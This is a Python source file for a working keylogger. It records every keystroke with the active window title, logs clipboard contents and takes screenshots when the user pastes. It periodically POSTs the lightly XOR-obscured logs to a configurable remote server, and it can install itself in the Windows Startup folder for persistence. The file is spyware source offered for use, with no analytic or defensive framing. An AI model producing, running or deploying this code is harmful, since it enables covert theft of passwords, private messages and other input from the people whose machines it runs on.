import logging
import http.client
import urllib.parse
import keyboard  # Requires: pip install keyboard
import threading
import time
import argparse
import os
import sys

try:
    import pyperclip
except ImportError:
    pyperclip = None

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

import ctypes

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

key = b'Sixteen byte key'

LOG_FILE = "keylogs.txt"
LOG_BUFFER = []
SEND_INTERVAL = 60  # seconds

def xor_encrypt(data, key=b'secretkey'):
    return ''.join(chr(ord(c) ^ key[i % len(key)]) for i, c in enumerate(data))

def pad(data):
    pad_len = 16 - (len(data) % 16)
    return data + chr(pad_len) * pad_len

def encrypt_data(data):
    # Simple XOR encryption for demonstration
    return xor_encrypt(data)

def save_log_locally(log_message):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_message + "\n")

def email_logs(log_message):
    # Dummy function for demonstration
    logging.info(f"Emailing logs: {log_message[:50]}...")

def send_logs_to_server(log_message, server="your-encrypted-server.com"):
    params = {'message': log_message}
    try:
        conn = http.client.HTTPSConnection(server)
        conn.request(
            "POST",
            "/log",
            urllib.parse.urlencode(params),
            headers={"Content-type": "application/x-www-form-urlencoded"}
        )
        response = conn.getresponse()
        response.read()
        conn.close()
        logging.info("Logs sent to server.")
    except Exception as e:
        logging.error(f"Failed to send logs: {e}")

def upload_to_google_drive(log_message):
    # Dummy function for demonstration
    logging.info("Uploading logs to Google Drive (dummy).")

def get_active_window_title():
    try:
        if sys.platform == 'win32':
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
        else:
            return "UnknownWindow"
    except Exception:
        return "UnknownWindow"

def take_screenshot(filename="screenshot.png"):
    if ImageGrab:
        try:
            img = ImageGrab.grab()
            img.save(filename)
            logging.info(f"Screenshot saved: {filename}")
        except Exception as e:
            logging.warning(f"Screenshot failed: {e}")

def add_to_startup():
    if sys.platform == 'win32':
        import shutil
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        script_path = os.path.abspath(sys.argv[0])
        dest = os.path.join(startup_path, os.path.basename(script_path))
        if not os.path.exists(dest):
            shutil.copy(script_path, dest)
            logging.info("Added to Windows startup.")

def on_key_press(key_name):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    window_title = get_active_window_title()
    log_message = f"{timestamp} - [{window_title}] - Key Pressed: {key_name}"
    LOG_BUFFER.append(log_message)
    save_log_locally(log_message)
    logging.info(log_message)

    # Clipboard logging on Ctrl+V
    if key_name == 'v' and keyboard.is_pressed('ctrl'):
        if pyperclip:
            clipboard_content = pyperclip.paste()
            clip_log = f"{timestamp} - [{window_title}] - Clipboard: {clipboard_content}"
            LOG_BUFFER.append(clip_log)
            save_log_locally(clip_log)
            logging.info(clip_log)
        else:
            logging.warning("pyperclip not installed, clipboard logging skipped.")
        # Screenshot on paste
        if ImageGrab:
            screenshot_file = f"screenshot_{int(time.time())}.png"
            take_screenshot(screenshot_file)

def periodic_sender(server, interval, email=False, gdrive=False):
    while True:
        time.sleep(interval)
        if LOG_BUFFER:
            batch = "\n".join(LOG_BUFFER)
            send_logs_to_server(encrypt_data(batch), server)
            if email:
                email_logs(batch)
            if gdrive:
                upload_to_google_drive(batch)
            LOG_BUFFER.clear()

def keylogger_loop(server, interval, email, gdrive):
    logging.info("Keylogger started. Press ESC to stop.")
    sender_thread = threading.Thread(target=periodic_sender, args=(server, interval, email, gdrive), daemon=True)
    sender_thread.start()
    while True:
        try:
            event = keyboard.read_event()
            if event.event_type == "down":
                on_key_press(event.name)
            elif event.event_type == "up":
                logging.info('Key Released: {}'.format(event.name))
            if event.name == 'esc' and event.event_type == "down":
                logging.info("ESC pressed. Exiting keylogger.")
                break
        except Exception as e:
            logging.error(f"Unexpected error occurred: {e}")
            break

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Enhanced Keylogger")
    parser.add_argument('--server', type=str, default="your-encrypted-server.com", help="Server to send logs to")
    parser.add_argument('--interval', type=int, default=SEND_INTERVAL, help="Interval (seconds) to send logs")
    parser.add_argument('--email', action='store_true', help="Email logs as well")
    parser.add_argument('--gdrive', action='store_true', help="Upload logs to Google Drive")
    parser.add_argument('--startup', action='store_true', help="Add to system startup (Windows only)")
    args = parser.parse_args()

    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    if args.startup:
        add_to_startup()

    keylogger_loop(args.server, args.interval, args.email, args.gdrive)